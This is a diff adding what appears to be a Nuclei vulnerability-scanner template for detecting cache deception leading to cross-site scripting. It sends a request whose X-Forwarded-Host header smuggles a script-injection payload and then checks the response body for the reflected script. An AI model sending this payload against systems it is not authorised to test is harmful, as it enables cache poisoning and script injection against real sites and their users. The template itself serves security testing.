@@ -1,0 +1,22 @@
+id: cahce-deception
+
+info:
+  name: Cache Deception to XSS
+  author: abdulrahman
+  severity: medium
+  tags: xss,generic
+  reference: https://hackerone.com/reports/394016
+
+requests:
+  - raw:
+    - |
+      GET /?xss HTTP/1.1
+      Host: {{Hostname}}
+      X-Forwarded-Host: cacche'"><script>alert(document.domain)</script>
+
+
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(document.domain)</script>"
+        part: body
